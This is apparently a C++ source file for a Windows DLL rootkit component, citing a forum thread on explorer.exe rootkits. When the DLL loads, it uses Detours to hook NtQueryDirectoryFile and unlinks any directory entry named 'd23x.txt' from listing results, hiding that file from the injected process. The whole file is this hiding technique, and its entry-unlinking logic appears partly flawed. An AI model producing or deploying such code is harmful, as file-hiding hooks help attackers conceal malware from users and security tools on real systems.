// dllmain.cpp : Defines the entry point for the DLL application.
//http://www.rohitab.com/discuss/topic/43368-windows-10-explorerexe-rootkit-question/
#include "pch.h"
#include "imports.h"
#include "detours.h"

bool compareToFileName(PFILE_ID_BOTH_DIR_INFORMATION PFileIdFullDirInfo, const char* filename) {

    ANSI_STRING as;
    UNICODE_STRING EntryName;
    EntryName.MaximumLength = EntryName.Length = (USHORT)PFileIdFullDirInfo->FileNameLength;
    EntryName.Buffer = &PFileIdFullDirInfo->FileName[0];
    originalRtlUnicodeStringToAnsiString(&as, &EntryName, TRUE);

    if (strcmp(as.Buffer, filename) == 0) {
        return true;
    }
    else {
        return false;
    }
}

NTSTATUS WINAPI Mine_NtQueryDirectoryFile(IN HANDLE FileHandle, IN HANDLE Event OPTIONAL, IN PVOID ApcRoutine OPTIONAL, IN PVOID ApcContext OPTIONAL,
    OUT PIO_STATUS_BLOCK IoStatusBlock, OUT PVOID FileInformation, IN ULONG Length, IN FILE_INFORMATION_CLASS FileInformationClass,
    IN BOOLEAN ReturnSingleEntry, IN PUNICODE_STRING FileName OPTIONAL, IN BOOLEAN RestartScan)
{
    NTSTATUS status = originalNtQueryDirectoryFile(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, ReturnSingleEntry, FileName, RestartScan);
    
    PFILE_FULL_DIR_INFORMATION pFileFullDirInfo;
    PFILE_BOTH_DIR_INFORMATION pFileBothDirInfo;


    switch (FileInformationClass) {
    case fileFullDirectoryInformation:
        pFileFullDirInfo = (PFILE_FULL_DIR_INFORMATION)FileInformation;
        while (pFileFullDirInfo->NextEntryOffset) {
            pFileFullDirInfo = (PFILE_FULL_DIR_INFORMATION)((LPBYTE)pFileFullDirInfo + pFileFullDirInfo->NextEntryOffset);
        }
        break;
    case fileBothDirectoryInformation:
        pFileBothDirInfo = (PFILE_BOTH_DIR_INFORMATION)FileInformation;
        while (pFileBothDirInfo->NextEntryOffset) {         
            pFileBothDirInfo = (PFILE_BOTH_DIR_INFORMATION)((LPBYTE)pFileBothDirInfo + pFileBothDirInfo->NextEntryOffset);
        }
        break;
    case fileIdBothDirectoryInformation:
        
        PFILE_ID_BOTH_DIR_INFORMATION current = (PFILE_ID_BOTH_DIR_INFORMATION)FileInformation;

        while (current->NextEntryOffset) {
            PFILE_ID_BOTH_DIR_INFORMATION next = (PFILE_ID_BOTH_DIR_INFORMATION)((LPBYTE)current + current->NextEntryOffset);
           
            if (compareToFileName(next, "d23x.txt") == true) {
                if (next->NextEntryOffset != 0) {
                    next = (PFILE_ID_BOTH_DIR_INFORMATION)((LPBYTE)next + next->NextEntryOffset);
                    current->NextEntryOffset += next->NextEntryOffset;
                }
                else {
                    current->NextEntryOffset = 0;
                } 
            }
            else {
                current = next;
            }
        }

        break;
    }

    return status;
}

void attachDetours() {

    DetourRestoreAfterWith();
    DetourTransactionBegin();
    DetourUpdateThread(GetCurrentThread());

    DetourAttach((PVOID*)&originalNtQueryDirectoryFile, Mine_NtQueryDirectoryFile);

    DetourTransactionCommit();
}

void deAttachDetours() {

    DetourTransactionBegin();
    DetourUpdateThread(GetCurrentThread());

    DetourDetach((PVOID*)&originalNtQueryDirectoryFile, Mine_NtQueryDirectoryFile);

    DetourTransactionCommit();
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        attachDetours();
        break;
    case DLL_PROCESS_DETACH:
        deAttachDetours();
        break;
    }
    return TRUE;
}

